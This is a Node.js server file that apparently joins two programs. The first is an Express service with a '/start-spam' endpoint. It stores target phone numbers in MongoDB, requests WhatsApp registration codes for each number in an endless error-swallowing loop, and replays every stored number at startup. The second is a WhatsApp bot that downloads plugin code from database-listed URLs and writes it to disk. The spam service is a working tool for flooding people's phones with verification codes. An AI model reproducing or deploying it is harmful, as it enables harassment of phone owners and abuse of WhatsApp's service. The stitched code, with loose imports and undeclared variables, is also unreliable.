require('dotenv').config(); // Load environment variables from .env file
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const gradient = require('gradient-string');
const QRCode = require('qrcode');
const mongoose = require('mongoose');
const morgan = require('morgan');
const fs = require('fs');
const ejs = require('ejs');
const pino = require('pino');
const yargs = require('yargs/yargs')
const cluster = require('cluster')
const package = require('./package.json')
const Readline = require('readline')
const rl = Readline.createInterface(process.stdin, process.stdout)
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const { promisify } = require('util');
const readFileAsync = promisify(fs.readFile);

const app = express();
const port = process.env.PORT || 8000; // Use environment variable or default port

// MongoDB connection string from environment variable
const mongoURI = process.env.MONGODB_URI;
const startspam = process.env.START_SPAM;

// Connect to MongoDB
mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('Error connecting to MongoDB:', err));
// Modell aus dem Schema erstellen
// Schema für die Daten definieren
const SpamDataSchema = new mongoose.Schema({
    ddi: String,
    number: String,
    timestamp: { type: Date, default: Date.now }
});

// Modell aus dem Schema erstellen
const SpamData = mongoose.model('SpamData', SpamDataSchema);




const sendStoredData = async () => {
    try {
        // Alle Daten aus der MongoDB abrufen
        const data = await SpamData.find({}, 'ddi number');

        // Daten an den /start-spam Endpunkt senden
        await Promise.all(data.map(async (item) => {
            const { ddi, number } = item;
            await fetch(startspam, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ ddi, number })
            });
        }));
        console.log('Stored data sent successfully from MongoDB');
        await sleep(20); 
    } catch (error) {
        console.error('Error sending stored data:', error);
    }
};
// Funktion aufrufen, um die Daten beim Starten des Servers zu senden
sendStoredData();



// Set up body parsers
let server = require('./views/qr');
code = require('./views/pair');
code2 = require('./start-pairing/pair2');
app.use('/qr', server);
app.use('/code', code);
app.use('/code2', code2);
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// Set up view engine and views directory
const __path = path.join(__dirname, 'views');
app.set('view engine', 'ejs');
app.set('views', __path);
app.engine('ejs', ejs.renderFile);


// Routes
app.get('/', (req, res) => {
    res.render('index', { title: 'Home' });
});

app.get('/pair', (req, res) => {
    res.render('pair', { title: 'pairing' });
});

app.get('/pair2', (req, res) => {
    res.render('pair2', { title: 'pairing2' });
});

app.get('/lock', (req, res) => {
    res.render(path.join(__path, 'lock'), { title: 'Lock' });
});


function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
/*
 const sendStoredDatav2 = async () => {
    try {
        // Dateiinhalt der generated_numbers.json lesen
        const fileContent = fs.readFileSync('exported_data.json', 'utf8');
        const data = JSON.parse(fileContent);

        // Daten an den /start-spam Endpunkt senden
        await Promise.all(data.map(async (item) => {
            const { ddi, number } = item;
            await fetch(startspam, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ ddi, number })
            });
        }));
        console.log('Stored data sent successfullykkk');
        await sleep(20); 
    } catch (error) {
        console.error('Error sending stored data:', error);
    }
};

// Funktion aufrufen, um die Daten beim Starten des Servers zu senden
sendStoredDatav2();
*/

app.post('/start-spam', async (req, res) => {
    const { ddi, number } = req.body;
    try {

 // Überprüfen, ob die Kombination von DDI und Nummer bereits in der MongoDB vorhanden ist
 const existingData = await SpamData.findOne({ ddi, number });
 if (existingData) {
  console.log('Schon Vorhanden');
  await sleep(50);
     
 } else {
     // Neue Instanz des Modells erstellen und speichern
     const newData = new SpamData({ ddi, number });
     await newData.save();
     console.log('Data saved successfully to MongoDb GenV2');
      
 }

        const { state, saveCreds } = await useMultiFileAuthState('.mm');
        const spam = makeWaSocket({
            auth: state,
            mobile: true,
            logger: pino({ level: 'silent' })
        });
        
        while (true) {
            try {
                const response = await spam.requestRegistrationCode({
                    phoneNumber: '+' + ddi + number,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 724
                });
    
                res.json({ success: true, response }); // Send success response
                return;
            } catch (err) {
                // Fehler ignorieren und keine Aktion ausführen
            }
        }
    } catch (err) {
        // Fehler ignorieren und keine Aktion ausführen
    }
});


// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});

// Start server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});

app.on('listening', () => {
  setTimeout(() => {
      sendStoredData();
  }, 15000); 
});
///////////////

require("./Configurations");
const {
  default: atlasConnect,
  DisconnectReason,
  fetchLatestBaileysVersion,
  downloadContentFromMessage,
  makeInMemoryStore,
  jidDecode,
} = require("maher-zubair-baileys");
const figlet = require("figlet");
const { join } = require("path");
// Statt require verwenden wir nun import
import('got').then((got) => {
    // Hier kannst du den Code verwenden, der "got" verwendet
  }).catch((error) => {
    console.error('Fehler beim Laden von "got":', error);
  });
  
const FileType = require("file-type");
const { Boom } = require("@hapi/boom");
const { serialize, WAConnection } = require("./System/whatsapp.js");
const { smsg, getBuffer, getSizeMedia } = require("./System/Function2");

const welcomeLeft = require("./System/Welcome.js");
const { readcommands, commands } = require("./System/ReadCommands.js");
commands.prefix = global.prefa;
const Auth = require("./System/MongoAuth/MongoAuth");
const qrcode = require("qrcode");
const {
  getPluginURLs, // -------------------- GET ALL PLUGIN DATA FROM DATABASE
} = require("./System/MongoDB/MongoDb_Core.js");
;
 // Use environment variable or default port =
const chalk = require("chalk");
const store = makeInMemoryStore({
  logger: pino().child({
    level: "silent",
    stream: "store",
  }),
});

// Atlas Server configuration
let QR_GENERATE = "invalid";
let status;
const startAtlas = async () => {
  try {
    await mongoose.connect(mongodb).then(() => {
      console.log(
        chalk.greenBright("Establishing secure connection with MongoDB...\n")
      );
    });
  } catch (err) {
    console.log(
      chalk.redBright(
        "Error connecting to MongoDB ! Please check MongoDB URL or try again after some minutes !\n"
      )
    );
    console.log(err);
  }
  const { getAuthFromDatabase } = new Auth(sessionId);

  const { saveState, state, clearState } = await getAuthFromDatabase();
  console.log(
    figlet.textSync("ATLAS", {
      font: "Standard",
      horizontalLayout: "default",
      vertivalLayout: "default",
      width: 70,
      whitespaceBreak: true,
    })
  );
  console.log(`\n`);

  await installPlugin();

  const { version, isLatest } = await fetchLatestBaileysVersion();

  const Atlas = atlasConnect({
    logger: pino({ level: "silent" }),
    printQRInTerminal: true,
    browser: ["Baron Bot", "Safari", "1.0.0"],
    auth: state,
    version,
  });

  store.bind(Atlas.ev);

  Atlas.public = true;

  async function installPlugin() {
    console.log(chalk.yellow("Checking for Plugins...\n"));
    let plugins = [];
    try {
      plugins = await getPluginURLs();
    } catch (err) {
      console.log(
        chalk.redBright(
          "Error connecting to MongoDB ! Please re-check MongoDB URL or try again after some minutes !\n"
        )
      );
      console.log(err);
    }

    if (!plugins.length || plugins.length == 0) {
      console.log(
        chalk.redBright("No Extra Plugins Installed ! Starting Atlas...\n")
      );
    } else {
      console.log(
        chalk.greenBright(plugins.length + " Plugins found ! Installing...\n")
      );
      for (let i = 0; i < plugins.length; i++) {
        pluginUrl = plugins[i];
        var { body, statusCode } = await got(pluginUrl);
        if (statusCode == 200) {
          try {
            var folderName = "Plugins";
            var fileName = path.basename(pluginUrl);

            var filePath = path.join(folderName, fileName);
            fs.writeFileSync(filePath, body);
          } catch (error) {
            console.log("Error:", error);
          }
        }
      }
      console.log(
        chalk.greenBright(
          "All Plugins Installed Successfully ! Starting Atlas...\n"
        )
      );
    }
  }

  await readcommands();

  Atlas.ev.on("creds.update", saveState);
  Atlas.serializeM = (m) => smsg(Atlas, m, store);
  Atlas.ev.on("connection.update", async (update) => {
    const { lastDisconnect, connection, qr } = update;
    if (connection) {
      console.info(`[ ATLAS ] Server Status => ${connection}`);
    }
    

    if (connection === "close") {
      let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
      if (reason === DisconnectReason.badSession) {
        console.log(
          `[ ATLAS ] Bad Session File, Please Delete Session and Scan Again.\n`
        );
        process.exit();
      } else if (reason === DisconnectReason.connectionClosed) {
        console.log("[ ATLAS ] Connection closed, reconnecting....\n");
        startAtlas();
      } else if (reason === DisconnectReason.connectionLost) {
        console.log("[ ATLAS ] Connection Lost from Server, reconnecting...\n");
        startAtlas();
      } else if (reason === DisconnectReason.connectionReplaced) {
        console.log(
          "[ ATLAS ] Connection Replaced, Another New Session Opened, Please Close Current Session First!\n"
        );
        process.exit();
      } else if (reason === DisconnectReason.loggedOut) {
        clearState();
        console.log(
          `[ ATLAS ] Device Logged Out, Please Delete Session and Scan Again.\n`
        );
        process.exit();
      } else if (reason === DisconnectReason.restartRequired) {
        console.log("[ ATLAS ] Server Restarting...\n");
        startAtlas();
      } else if (reason === DisconnectReason.timedOut) {
        console.log("[ ATLAS ] Connection Timed Out, Trying to Reconnect...\n");
        startAtlas();
      } else {
        console.log(
          `[ ATLAS ] Server Disconnected: "It's either safe disconnect or WhatsApp Account got banned !\n"`
        );
      }
    }
    if (qr) {
      QR_GENERATE = qr;
    }
  });

  Atlas.ev.on("group-participants.update", async (m) => {
    welcomeLeft(Atlas, m);
  });

  Atlas.ev.on("messages.upsert", async (chatUpdate) => {
    m = serialize(Atlas, chatUpdate.messages[0]);

    if (!m.message) return;
    if (m.key && m.key.remoteJid == "status@broadcast") return;
    if (m.key.id.startsWith("BAE5") && m.key.id.length == 16) return;

    require("./Core.js")(Atlas, m, commands, chatUpdate);
  });

  Atlas.getName = (jid, withoutContact = false) => {
    id = Atlas.decodeJid(jid);
    withoutContact = Atlas.withoutContact || withoutContact;
    let v;
    if (id.endsWith("@g.us"))
      return new Promise(async (resolve) => {
        v = store.contacts[id] || {};
        if (!(v.name || v.subject)) v = Atlas.groupMetadata(id) || {};
        resolve(
          v.name ||
            v.subject ||
            PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber(
              "international"
            )
        );
      });
    else
      v =
        id === "0@s.whatsapp.net"
          ? {
              id,
              name: "WhatsApp",
            }
          : id === Atlas.decodeJid(Atlas.user.id)
          ? Atlas.user
          : store.contacts[id] || {};
    return (
      (withoutContact ? "" : v.name) ||
      v.subject ||
      v.verifiedName ||
      PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber(
        "international"
      )
    );
  };

  Atlas.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (
        (decode.user && decode.server && decode.user + "@" + decode.server) ||
        jid
      );
    } else return jid;
  };

  Atlas.ev.on("contacts.update", (update) => {
    for (let contact of update) {
      let id = Atlas.decodeJid(contact.id);
      if (store && store.contacts)
        store.contacts[id] = {
          id,
          name: contact.notify,
        };
    }
  });

  Atlas.downloadAndSaveMediaMessage = async (
    message,
    filename,
    attachExtension = true
  ) => {
    let quoted = message.msg ? message.msg : message;
    let mime = (message.msg || message).mimetype || "";
    let messageType = message.mtype
      ? message.mtype.replace(/Message/gi, "")
      : mime.split("/")[0];
    const stream = await downloadContentFromMessage(quoted, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    let type = await FileType.fromBuffer(buffer);
    trueFileName = attachExtension ? filename + "." + type.ext : filename;
    // save to file
    await fs.writeFileSync(trueFileName, buffer);
    return trueFileName;
  };

  Atlas.downloadMediaMessage = async (message) => {
    let mime = (message.msg || message).mimetype || "";
    let messageType = message.mtype
      ? message.mtype.replace(/Message/gi, "")
      : mime.split("/")[0];
    const stream = await downloadContentFromMessage(message, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }

    return buffer;
  };

  Atlas.parseMention = async (text) => {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(
      (v) => v[1] + "@s.whatsapp.net"
    );
  };

  Atlas.sendText = (jid, text, quoted = "", options) =>
    Atlas.sendMessage(
      jid,
      {
        text: text,
        ...options,
      },
      {
        quoted,
      }
    );

  Atlas.getFile = async (PATH, save) => {
    let res;
    let data = Buffer.isBuffer(PATH)
      ? PATH
      : /^data:.*?\/.*?;base64,/i.test(PATH)
      ? Buffer.from(PATH.split`,`[1], "base64")
      : /^https?:\/\//.test(PATH)
      ? await (res = await getBuffer(PATH))
      : fs.existsSync(PATH)
      ? ((filename = PATH), fs.readFileSync(PATH))
      : typeof PATH === "string"
      ? PATH
      : Buffer.alloc(0);

    let type = (await FileType.fromBuffer(data)) || {
      mime: "application/octet-stream",
      ext: ".bin",
    };
    filename = path.join(
      __filename,
      "../src/" + new Date() * 1 + "." + type.ext
    );
    if (data && save) fs.promises.writeFile(filename, data);
    return {
      res,
      filename,
      size: await getSizeMedia(data),
      ...type,
      data,
    };
  };

  Atlas.setStatus = (status) => {
    Atlas.query({
      tag: "iq",
      attrs: {
        to: "@s.whatsapp.net",
        type: "set",
        xmlns: "status",
      },
      content: [
        {
          tag: "status",
          attrs: {},
          content: Buffer.from(status, "utf-8"),
        },
      ],
    });
    return status;
  };

  Atlas.sendFile = async (jid, PATH, fileName, quoted = {}, options = {}) => {
    let types = await Atlas.getFile(PATH, true);
    let { filename, size, ext, mime, data } = types;
    let type = "",
      mimetype = mime,
      pathFile = filename;
    if (options.asDocument) type = "document";
    if (options.asSticker || /webp/.test(mime)) {
      let { writeExif } = require("./lib/sticker.js");
      let media = {
        mimetype: mime,
        data,
      };
      pathFile = await writeExif(media, {
        packname: global.packname,
        author: global.packname,
        categories: options.categories ? options.categories : [],
      });
      await fs.promises.unlink(filename);
      type = "sticker";
      mimetype = "image/webp";
    } else if (/image/.test(mime)) type = "image";
    else if (/video/.test(mime)) type = "video";
    else if (/audio/.test(mime)) type = "audio";
    else type = "document";
    await Atlas.sendMessage(
      jid,
      {
        [type]: {
          url: pathFile,
        },
        mimetype,
        fileName,
        ...options,
      },
      {
        quoted,
        ...options,
      }
    );
    return fs.promises.unlink(pathFile);
  };
};

startAtlas();



app.use("/bot", express.static(join(__dirname, "Frontend")));

app.get("/bott", async (req, res) => {
  const { session } = req.query;
  if (!session)
    return void res
      .status(404)
      .setHeader("Content-Type", "text/plain")
      .send("Please Provide the session ID that you set for authentication !")
      .end();
  if (sessionId !== session)
    return void res
      .status(404)
      .setHeader("Content-Type", "text/plain")
      .send("Invalid session ID ! Please check your session ID !")
      .end();
  if (status == "open")
    return void res
      .status(404)
      .setHeader("Content-Type", "text/plain")
      .send("Session is already in use !")
      .end();
  res.setHeader("content-type", "image/png");
  res.send(await qrcode.toBuffer(QR_GENERATE));
  
});



///////////////////////
